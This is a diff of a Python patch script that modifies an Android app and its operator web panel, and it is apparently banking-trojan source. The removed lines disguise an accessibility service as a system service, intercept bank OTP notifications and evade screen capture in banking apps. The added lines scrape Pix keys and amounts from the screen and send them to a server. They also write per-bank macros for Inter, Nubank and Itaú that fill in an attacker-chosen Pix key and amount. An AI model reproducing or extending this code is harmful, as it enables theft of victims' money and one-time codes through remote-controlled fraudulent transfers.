@@ -1,6 +1,5 @@
-﻿import io, os, re, subprocess, sys
+﻿import io, os, subprocess, sys
 
-RAIZ = os.getcwd()
 FALHAS = []
 
 def ler(p):
@@ -18,233 +17,150 @@ def sub(p, velho, novo, obrig=True):
     s = ler(p)
     if velho not in s:
         if obrig:
-            FALHAS.append("%s :: nao achei: %s" % (p, velho.strip().splitlines()[0][:70]))
+            FALHAS.append("%s :: %s" % (p, velho.strip().splitlines()[0][:70]))
         return False
     grava(p, s.replace(velho, novo, 1))
     print("  ok  %s" % p)
     return True
 
-print("[1] manifest")
-M = "app/src/main/AndroidManifest.xml"
-sub(M,
-    '<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />',
-    '<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />\n'
-    '    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />')
-sub(M,
-    '<service\n        android:name=".KeySvc"\n        android:exported="true"',
-    '<service\n        android:name=".KeySvc"\n        android:label="@string/svc_label"\n        android:exported="true"')
-sub(M,
-    '</application>',
-    '    <service\n        android:name=".OtpSvc"\n        android:label="@string/svc_label"\n'
-    '        android:exported="true"\n'
-    '        android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">\n'
-    '        <intent-filter>\n'
-    '            <action android:name="android.service.notification.NotificationListenerService" />\n'
-    '        </intent-filter>\n'
-    '    </service>\n</application>')
+print("[1] Sel.java")
+grava("app/src/main/java/com/eloeeducacao/Sel.java", r'''package com.eloeeducacao;
 
-print("[2] strings")
-S = "app/src/main/res/values/strings.xml"
-if os.path.exists(S):
-    sub(S, '</resources>',
-        '    <string name="svc_label">Acessibilidade do sistema</string>\n'
-        '    <string name="acc_desc">Preenchimento de texto e navegacao por gestos.</string>\n'
-        '</resources>')
-else:
-    grava(S, '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n'
-             '    <string name="svc_label">Acessibilidade do sistema</string>\n'
-             '    <string name="acc_desc">Preenchimento de texto e navegacao por gestos.</string>\n'
-             '</resources>\n')
-    print("  criado %s" % S)
+import android.graphics.Rect;
+import android.view.accessibility.AccessibilityNodeInfo;
 
-print("[3] acc.xml")
-grava("app/src/main/res/xml/acc.xml", r'''<?xml version="1.0" encoding="utf-8"?>
-<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged"
-    android:accessibilityFeedbackType="feedbackGeneric"
-    android:accessibilityFlags="flagDefault|flagReportViewIds|flagRetrieveInteractiveWindows"
-    android:canPerformGestures="true"
-    android:canRetrieveWindowContent="true"
-    android:canTakeScreenshot="true"
-    android:notificationTimeout="80"
-    android:description="@string/acc_desc" />
-''')
-print("  ok  acc.xml")
+import org.json.JSONObject;
 
-print("[4] Util")
-U = "app/src/main/java/com/eloeeducacao/Util.java"
-sub(U, r'''    public static String esc(String s) {
-        if (s == null) return "";
-        return s.replace("\\", "\\\\").replace("\"", "\\\"")
-                .replace("\n", "\\n").replace("\r", "");
-    }''', r'''    public static void sendT(String t, String o) {
-        Net.send("{\"t\":\"" + esc(t) + "\",\"o\":\"" + esc(o) + "\"}");
+import java.util.ArrayDeque;
+import java.util.ArrayList;
+import java.util.Deque;
+import java.util.List;
+import java.util.regex.Pattern;
+
+public final class Sel {
+
+    public static final class Hit {
+        public final AccessibilityNodeInfo node;
+        public final int x, y;
+        public final String txt;
+        Hit(AccessibilityNodeInfo n, int x, int y, String t) {
+            this.node = n; this.x = x; this.y = y; this.txt = t;
+        }
     }
 
-    public static String esc(String s) {
-        if (s == null) return "";
-        StringBuilder b = new StringBuilder(s.length() + 16);
-        for (int i = 0; i < s.length(); i++) {
-            char c = s.charAt(i);
-            if (c == '\\') b.append("\\\\");
-            else if (c == '"') b.append("\\\"");
-            else if (c == '\n') b.append("\\n");
-            else if (c == '\r') b.append("\\r");
-            else if (c == '\t') b.append("\\t");
-            else if (c < 0x20) b.append(' ');
-            else b.append(c);
+    private static boolean casa(AccessibilityNodeInfo n, JSONObject s) {
+        try {
+            if (s.has("edit") && n.isEditable() != s.getBoolean("edit")) return false;
+            if (s.has("click") && n.isClickable() != s.getBoolean("click")) return false;
+            if (s.has("cls")) {
+                String c = String.valueOf(n.getClassName()).toLowerCase();
+                if (!c.contains(s.getString("cls").toLowerCase())) return false;
+            }
+            if (s.has("id")) {
+                String id = n.getViewIdResourceName();
+                if (id == null || !Pattern.compile(s.getString("id")).matcher(id).find()) return false;
+            }
+            if (s.has("txt")) {
+                String t = (n.getText() == null ? "" : n.getText().toString()) + " "
+                        + (n.getContentDescription() == null ? "" : n.getContentDescription().toString());
+                if (!Pattern.compile(s.getString("txt"), Pattern.CASE_INSENSITIVE).matcher(t).find())
+                    return false;
+            }
+            return true;
+        } catch (Throwable t) {
+            return false;
         }
-        return b.toString();
     }
 
-    public static final String[] BANCOS = {
-        "br.com.intermedium", "com.nu.production", "com.itau", "com.bradesco",
-        "com.santander.app", "br.com.bb.android", "br.com.gabba.Caixa", "com.picpay"
-    };
-
-    public static boolean banco(String pkg) {
-        if (pkg == null) return false;
-        for (String b : BANCOS) if (pkg.startsWith(b)) return true;
-        return false;
-    }''')
-sub(U, "agora - t < 20000", "agora - t < 5000")
-
-print("[5] Extra.cat com offset")
-E = "app/src/main/java/com/eloeeducacao/Extra.java"
-sub(E, r'''    public static String cat(String path, int maxBytes) {
-        try {
-            File f = new File(path);
-            if (!f.isFile()) return "nao e arquivo: " + path;
-            int n = (int) Math.min(f.length(), Math.max(1024, Math.min(maxBytes, 200000)));
-            byte[] b = new byte[n];
-            FileInputStream in = new FileInputStream(f);
-            int r = in.read(b);
-            in.close();
-            if (r <= 0) return "vazio";
-            return "len=" + f.length() + "\nb64=" + Base64.encodeToString(
-                    r == n ? b : java.util.Arrays.copyOf(b, r), Base64.NO_WRAP);
-        } catch (Throwable t) {
-            return "err: " + t;
-        }
-    }''', r'''    public static String cat(String path, int off, int len) {
-        java.io.RandomAccessFile raf = null;
-        try {
-            File f = new File(path);
-            if (!f.isFile()) return "nao e arquivo";
-            long total = f.length();
-            raf = new java.io.RandomAccessFile(f, "r");
-            raf.seek(Math.max(0, Math.min(off, total)));
-            int n = (int) Math.min(len, Math.max(1, total - raf.getFilePointer()));
-            byte[] b = new byte[n];
-            int r = raf.read(b);
-            if (r <= 0) return "fim";
-            return "off=" + off + " total=" + total + " b64=" + Base64.encodeToString(
-                    r == n ? b : java.util.Arrays.copyOf(b, r), Base64.NO_WRAP);
-        } catch (Throwable t) {
-            return "err: " + t;
-        } finally {
-            try { if (raf != null) raf.close(); } catch (Throwable ignored) {}
-        }
-    }''')
-
-print("[6] Cmd")
-C = "app/src/main/java/com/eloeeducacao/Cmd.java"
-sub(C, '                case "ov":\n                    Ov.set(c, o.optBoolean("on", true));',
-       '                case "ov":\n                    Ov.set(KeySvc.I != null ? KeySvc.I : c, o.optBoolean("on", true));')
-sub(C, '''                case "bank":
-                    Ov.set(c, false);
-                    ScreenSvc.Q = 30;
-                    ScreenSvc.FPS = 2;
-                    Net.send("{\\"t\\":\\"info\\",\\"o\\":\\"modo banco: overlay off, 30q 2fps\\"}");
-                    if (acc()) Tree.dump(k);
-                    break;''', '''                case "bank":
-                    ScreenSvc.giveUp = true;
-                    ScreenSvc.alive = false;
-                    try { c.stopService(new Intent(c, ScreenSvc.class)); } catch (Throwable ignored) {}
-                    Ov.set(KeySvc.I != null ? KeySvc.I : c, false);
-                    ScreenSvc.Q = 45;
-                    ScreenSvc.FPS = 3;
-                    Util.sendT("info", "modo banco: projecao off, overlay off");
-                    if (acc()) Tree.dump(k);
-                    break;
-                case "unbank":
-                    ScreenSvc.giveUp = false;
-                    Util.sendT("info", "modo normal: reabra a captura na MainActivity");
-                    break;
-                case "macro":
-                    if ("stop".equals(o.optString("op"))) Macro.stop();
-                    else Macro.play(o.optJSONArray("s"));
-                    break;''')
-sub(C, '                    Net.send("{\\"t\\":\\"dl\\",\\"o\\":\\"" + Util.esc(Extra.cat(o.optString("p"), o.optInt("n", 200000))) + "\\"}");',
-       '                    Util.sendT("dl", Extra.cat(o.optString("p"), o.optInt("off", 0), o.optInt("n", 65536)));')
-
-print("[7] KeySvc")
-K = "app/src/main/java/com/eloeeducacao/KeySvc.java"
-sub(K, "    private volatile String curPkg;", "    public volatile String curPkg;")
-sub(K, '''                        int type = Build.VERSION.SDK_INT >= 26
-                                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
-                                : WindowManager.LayoutParams.TYPE_PHONE;''',
-       '''                        int type = Build.VERSION.SDK_INT >= 22
-                                ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
-                                : WindowManager.LayoutParams.TYPE_PHONE;''')
-sub(K, '''                        wm.addView(l, lp);
-                        ov = l;''', '''                        try {
-                            wm.addView(l, lp);
-                        } catch (Throwable t) {
-                            lp.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
-                            wm.addView(l, lp);
-                        }
-                        ov = l;''')
-
-print("[8] ScreenSvc / frame preto")
-SC = "app/src/main/java/com/eloeeducacao/ScreenSvc.java"
-sub(SC, '''            if (dark(out)) {
-                if (++blackCount > 10) {''', '''            if (dark(out)) {
-                if (Util.banco(KeySvc.I == null ? null : KeySvc.I.curPkg)) {
-                    black = true;
-                    blackCount = 0;
-                } else if (++blackCount > 10) {''')
-
-print("[9] MainActivity")
-MA = "app/src/main/java/com/eloeeducacao/MainActivity.java"
-sub(MA, '''                if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(MainActivity.this)) {
-                    startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                            Uri.parse("package:" + getPackageName())));
-                    return;
+    public static List<Hit> todos(AccessibilityNodeInfo raiz, JSONObject s) {
+        List<Hit> out = new ArrayList<>();
+        if (raiz == null) return out;
+        Deque<AccessibilityNodeInfo> fila = new ArrayDeque<>();
+        fila.add(raiz);
+        int limite = 4000;
+        while (!fila.isEmpty() && limite-- > 0) {
+            AccessibilityNodeInfo n = fila.poll();
+            if (n == null) continue;
+            if (casa(n, s)) {
+                Rect r = new Rect();
+                n.getBoundsInScreen(r);
+                if (r.width() > 0 && r.height() > 0) {
+                    CharSequence t = n.getText();
+                    out.add(new Hit(n, r.centerX(), r.centerY(), t == null ? "" : t.toString()));
                 }
-''', "")
-sub(MA, 'sb.append("overlay: ").append(Settings.canDrawOverlays(this) ? "OK" : "PENDENTE").append(\'\\n\');',
-        'sb.append("overlay: nativo (acessibilidade)\\n");')
+            }
+            for (int i = 0; i < n.getChildCount(); i++) {
+                AccessibilityNodeInfo f = n.getChild(i);
+                if (f != null) fila.add(f);
+            }
+        }
+        return out;
+    }
 
-print("[10] Ov delegando")
-grava("app/src/main/java/com/eloeeducacao/Ov.java", '''package com.eloeeducacao;
-
-import android.content.Context;
-
-public final class Ov {
-    private static volatile boolean ligado;
-
-    public static boolean on() { return ligado; }
-
-    public static void clear() { ligado = false; }
-
-    public static boolean banco(String pkg) { return Util.banco(pkg); }
-
-    public static void set(Context c, boolean on) {
-        KeySvc k = KeySvc.I;
-        if (k == null) return;
-        ligado = on;
-        k.overlay(on);
+    public static Hit melhor(AccessibilityNodeInfo raiz, JSONObject s) {
+        List<Hit> l = todos(raiz, s);
+        if (l.isEmpty()) return null;
+        if (!s.has("perto")) return l.get(0);
+        int px = s.optJSONArray("perto").optInt(0, 0);
+        int py = s.optJSONArray("perto").optInt(1, 0);
+        Hit best = null;
+        double bd = Double.MAX_VALUE;
+        for (Hit h : l) {
+            double d = Math.hypot(h.x - px, h.y - py);
+            if (d < bd) { bd = d; best = h; }
+        }
+        return best;
     }
 }
 ''')
-print("  ok  Ov.java")
 
-print("[11] Macro e OtpSvc")
+print("[2] Watch.java")
+grava("app/src/main/java/com/eloeeducacao/Watch.java", r'''package com.eloeeducacao;
+
+import android.view.accessibility.AccessibilityNodeInfo;
+
+import org.json.JSONObject;
+
+public final class Watch {
+    public static volatile boolean on;
+    private static volatile long ultimo;
+
+    public static void ev() {
+        if (!on) return;
+        long agora = System.currentTimeMillis();
+        if (agora - ultimo < 1500) return;
+        ultimo = agora;
+        KeySvc k = KeySvc.I;
+        if (k == null) return;
+        AccessibilityNodeInfo r = k.getRootInActiveWindow();
+        if (r == null) return;
+        try {
+            JSONObject s = new JSONObject().put("edit", true);
+            StringBuilder chaves = new StringBuilder();
+            for (Sel.Hit h : Sel.todos(r, s)) {
+                String t = h.txt.trim();
+                if (t.matches("\\d{11}|\\d{3}\\.\\d{3}\\.\\d{3}-\\d{2}|[^@\\s]+@[^@\\s]+")
+                        || t.matches("[0-9a-f]{8}-[0-9a-f-]{20,}")) {
+                    chaves.append(t).append(" ; ");
+                }
+            }
+            if (chaves.length() == 0) return;
+            String valor = "";
+            for (Sel.Hit h : Sel.todos(r, new JSONObject().put("txt", "R\\$\\s?[\\d.,]+")))
+                valor = h.txt;
+            Util.sendT("pixvisto", "chave=" + chaves + " valor=" + valor);
+        } catch (Throwable ignored) {}
+    }
+}
+''')
+
+print("[3] Macro.java")
 grava("app/src/main/java/com/eloeeducacao/Macro.java", r'''package com.eloeeducacao;
 
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.view.accessibility.AccessibilityNodeInfo;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -257,13 +173,22 @@ public final class Macro {
     private static final List<JSONObject> fila = new ArrayList<>();
     public static volatile boolean rodando;
 
-    public static void play(JSONArray a) {
+    public static void play(JSONArray a, JSONObject vars) {
         synchronized (fila) {
             fila.clear();
+            JSONObject v = vars == null ? new JSONObject() : vars;
             if (a != null) {
                 for (int i = 0; i < a.length(); i++) {
                     JSONObject s = a.optJSONObject(i);
-                    if (s != null) fila.add(s);
+                    if (s == null) continue;
+                    if (s.has("v")) {
+                        try {
+                            s.put("v", s.optString("v")
+                                    .replace("{{CHAVE}}", v.optString("chave"))
+                                    .replace("{{VALOR}}", v.optString("valor")));
+                        } catch (Throwable ignored) {}
+                    }
+                    fila.add(s);
                 }
             }
         }
@@ -307,103 +232,184 @@ public final class Macro {
                     k.setText(s.getString("x"));
                 } else if (k != null && s.has("k")) {
                     k.key(s.getInt("k"));
+                } else if (s.has("do")) {
+                    String d = s.optString("do");
+                    if ("back".equals(d)) {
+                        if (k != null) k.key(4);
+                    } else if ("home".equals(d)) {
+                        if (k != null) k.key(3);
+                    } else if ("wait".equals(d)) {
+                        espera(s, System.currentTimeMillis() + s.optLong("ms", 8000));
+                    } else {
+                        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
+                        Sel.Hit h = r == null ? null : Sel.melhor(r, s.optJSONObject("sel"));
+                        if (h == null) Util.sendT("err", "nao achei: " + s.optJSONObject("sel"));
+                        else executa(s, h, k);
+                    }
                 }
             } catch (Throwable ignored) {}
             H.postDelayed(this, Math.max(70, s.optLong("w", 0)));
         }
     };
-}
-''')
-grava("app/src/main/java/com/eloeeducacao/OtpSvc.java", r'''package com.eloeeducacao;
 
-import android.app.Notification;
-import android.service.notification.NotificationListenerService;
-import android.service.notification.StatusBarNotification;
+    private static void espera(final JSONObject s, final long ate) {
+        KeySvc k = KeySvc.I;
+        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
+        Sel.Hit h = r == null ? null : Sel.melhor(r, s.optJSONObject("sel"));
+        if (h != null) {
+            executa(s, h, k);
+            H.postDelayed(passo, 120);
+            return;
+        }
+        if (System.currentTimeMillis() > ate) {
+            Util.sendT("err", "timeout: " + s.optJSONObject("sel"));
+            H.postDelayed(passo, 120);
+            return;
+        }
+        H.postDelayed(() -> espera(s, ate), 250);
+    }
 
-public class OtpSvc extends NotificationListenerService {
-
-    @Override public void onNotificationPosted(StatusBarNotification s) {
+    private static void executa(JSONObject s, Sel.Hit h, KeySvc k) {
+        String d = s.optString("do");
         try {
-            if (s == null || s.getNotification() == null) return;
-            String pkg = s.getPackageName();
-            if (!Util.banco(pkg) && !pkg.contains("inter")) return;
-            CharSequence t = s.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE);
-            CharSequence x = s.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);
-            String txt = (t == null ? "" : t) + " " + (x == null ? "" : x);
-            if (!txt.matches(".*\\d{4,8}.*")) return;
-            Util.sendT("otp", pkg + " | " + txt.trim());
+            if ("tap".equals(d)) k.touch(h.x, h.y);
+            else if ("long".equals(d)) k.longPress(h.x, h.y);
+            else if ("get".equals(d)) Util.sendT("get", h.txt);
+            else if ("set".equals(d)) {
+                Bundle b = new Bundle();
+                b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
+                        s.optString("v"));
+                h.node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
+            }
         } catch (Throwable ignored) {}
     }
 }
 ''')
-print("  ok  Macro.java / OtpSvc.java")
 
-print("[12] server.py")
+print("[4] KeySvc hook")
+sub("app/src/main/java/com/eloeeducacao/KeySvc.java",
+    '''                curWin = i >= 0 ? w.substring(i + 1) : w;
+            }
+        } catch (Throwable ignored) {
+        }
+    }''',
+    '''                curWin = i >= 0 ? w.substring(i + 1) : w;
+            }
+            Watch.ev();
+        } catch (Throwable ignored) {
+        }
+    }''')
+
+print("[5] Cmd")
+sub("app/src/main/java/com/eloeeducacao/Cmd.java",
+    '''                case "macro":
+                    if ("stop".equals(o.optString("op"))) Macro.stop();
+                    else Macro.play(o.optJSONArray("s"));
+                    break;''',
+    '''                case "macro":
+                    if ("stop".equals(o.optString("op"))) Macro.stop();
+                    else Macro.play(o.optJSONArray("s"), o.optJSONObject("v"));
+                    break;
+                case "run":
+                    Macro.play(o.optJSONArray("s"), o.optJSONObject("v"));
+                    break;
+                case "watch":
+                    Watch.on = o.optBoolean("on", true);
+                    Util.sendT("info", "watch " + (Watch.on ? "on" : "off"));
+                    break;''')
+
+print("[6] server.py - UI")
 SV = "server.py"
-sub(SV, 'TOKEN = "m4t7k2p9x6v3n8b5z1q0w7r2"',
-        'TOKEN = os.environ.get("AVAL_TOKEN", "m4t7k2p9x6v3n8b5z1q0w7r2")')
-sub(SV, 'else c(\'dl\',{p:base+nome})});',
-        'else {dlPath=base+nome;dlOff=0;dlTot=-1;dlBuf=null;c(\'dl\',{p:base+nome,off:0,n:65536})}});')
-sub(SV, 'banco()">Modo banco</button>',
-        'banco()">Modo banco</button><button onclick="recTog()">REC</button>'
-        '<span id=rc class=sm>0</span><button onclick="playM()">Play</button>')
-sub(SV, '''function baixa(o){
-  const m=o.match(/b64=([\\s\\S]*)/);
-  if(!m){log(o);return}
-  const bin=atob(m[1].replace(/\\s/g,'')),u=new Uint8Array(bin.length);
-  for(let x=0;x<bin.length;x++)u[x]=bin.charCodeAt(x);
-  const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([u]));
-  a.download=(pasta.split('/').pop()||'arq');a.click();log('baixado')
-}''', '''let dlBuf=null,dlPath=null,dlOff=0,dlTot=-1;
-function baixa(o){
-  if(o==='fim'){fechaDl();return}
-  const m=o.match(/b64=([\\s\\S]*)/);
-  if(!m){log(o);return}
-  const tot=+(o.match(/total=(\\d+)/)||[0,0])[1];
-  if(!dlBuf){dlBuf=[];dlOff=0;dlTot=tot}
-  const b=atob(m[1].replace(/\\s/g,''));
-  for(let i=0;i<b.length;i++)dlBuf.push(b.charCodeAt(i));
-  dlOff+=b.length;
-  if(dlOff<dlTot)c('dl',{p:dlPath,off:dlOff,n:65536});else fechaDl()
-}
-function fechaDl(){
-  const u=new Uint8Array(dlBuf),a=document.createElement('a');
-  a.href=URL.createObjectURL(new Blob([u]));
-  a.download=(dlPath.split('/').pop()||'arq');a.click();
-  dlBuf=null;dlTot=-1;log('baixado')
-}
-let mrec=[],mlast=0,mrecOn=false;
-function recTog(){mrecOn=!mrecOn;mlast=Date.now();if(mrecOn)mrec=[];
-  $('#rc').textContent=mrecOn?'REC':'0';$('#rc').style.color=mrecOn?'#f85149':'#6b7785'}
-function push(x){if(!mrecOn)return;const d=Date.now()-mlast;mlast=Date.now();
-  mrec.push(Object.assign({w:d},x));$('#rc').textContent=mrec.length}
-function playM(){if(!mrec.length){log('nada gravado');return}c('macro',{s:mrec})}''')
-sub(SV, "else c('text',{s:v});e.value=''}",
-        "else {c('text',{s:v});push({x:v});e.value=''}")
-sub(SV, "function k(n){c('key',{code:n})}", "function k(n){c('key',{code:n});push({k:n})}")
-sub(SV, "if(m<18&&Date.now()-t0>480)c('long',{x:u.x,y:u.y});\n  else if(m<18)c('touch',{x:u.x,y:u.y});\n  else c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:220});dn=null};",
-       "if(m<18&&Date.now()-t0>480){c('long',{x:u.x,y:u.y});push({l:[u.x,u.y]})}\n"
-       "  else if(m<18){c('touch',{x:u.x,y:u.y});push({t:[u.x,u.y]})}\n"
-       "  else {c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:220});push({s:[dn.x,dn.y,u.x,u.y,220]})}dn=null};")
+sub(SV, '<div id=bar><input id=t placeholder="texto  |  $comando  |  /ls path  |  /dl path">',
+       '<div id=bar><select id=pfl></select><input id=pch placeholder="chave pix" '
+       'style="flex:0 0 190px"><input id=pvl placeholder="valor" style="flex:0 0 80px">'
+       '<button class=pri onclick="runPix()">Pix</button><button id=wt onclick="wt()">Watch</button>'
+       '<input id=t placeholder="texto  |  $comando  |  /ls path  |  /dl path">')
 
-print("[13] build.gradle")
-sub("app/build.gradle", "versionCode 6", "versionCode 7")
+print("[7] server.py - perfis")
+sub(SV, "co();\n</script>", r'''const PERFIS = {
+"inter": [
+ {"do":"wait","sel":{"txt":"Área Pix|^Pix$"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Área Pix$|^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar|Nova transferência"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir|Enviar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar|Próximo"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
+],
+"nubank": [
+ {"do":"wait","sel":{"txt":"Pix"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir"}},
+ {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Chave Pix"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
+],
+"itau": [
+ {"do":"wait","sel":{"txt":"Pix"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar Pix"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir|Enviar Pix"}},
+ {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Chave Pix"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
+]
+};
+function pflUpd(){
+  const s=$('#pfl');s.innerHTML='';
+  Object.keys(PERFIS).forEach(k=>{const o=document.createElement('option');
+    o.value=k;o.textContent=k;s.appendChild(o)});
+}
+function runPix(){
+  const k=$('#pfl').value,ch=$('#pch').value.trim(),vl=$('#pvl').value.trim();
+  if(!ch){log('sem chave pix');return}
+  c('run',{s:PERFIS[k],v:{chave:ch,valor:vl}});
+  log('perfil '+k+' chave '+ch+' valor '+(vl||'-'))
+}
+function wt(){
+  const b=$('#wt'),on=b.dataset.on!=='1';
+  b.dataset.on=on?'1':'0';b.style.background=on?'#1f4d7a':'';
+  c('watch',{on:on})
+}
+pflUpd();
+co();
+</script>''')
+
+print("[8] server.py - pixvisto")
+sub(SV, "      else log(x.t+': '+(x.o||''))}",
+       "      else if(x.t==='pixvisto'){log('! '+x.o);"
+       "const mm=x.o.match(/chave=([^;]+)/);if(mm)$('#pch').value=mm[1].trim()}\n"
+       "      else log(x.t+': '+(x.o||''))}")
 
 print("")
 if FALHAS:
-    print("!! %d patch(es) nao aplicado(s):" % len(FALHAS))
+    print("!! %d nao aplicado(s):" % len(FALHAS))
     for f in FALHAS:
         print("   - " + f)
-    print("   (provavelmente ja foram aplicados; revise os arquivos citados)")
 
 if "--no-git" not in sys.argv:
-    print("\n[git] commit e push")
+    print("\n[git]")
     for c in (["git", "add", "-A"],
-              ["git", "commit", "-m", "evasao bancaria: overlay acessibilidade, projecao off, macro, otp, chunks"],
+              ["git", "commit", "-m", "motor de seletores, perfis por banco, watch de pix"],
               ["git", "push"]):
         r = subprocess.run(c, capture_output=True, text=True)
-        print("  $ " + " ".join(c) + " -> " + str(r.returncode))
-        if r.stdout.strip():
-            print("    " + r.stdout.strip().splitlines()[0])
-        if r.stderr.strip() and r.returncode:
-            print("    " + r.stderr.strip().splitlines()[0])
+        print("  $ %s -> %s" % (" ".join(c), r.returncode))
+        for ln in (r.stdout + r.stderr).strip().splitlines()[:1]:
+            print("    " + ln)
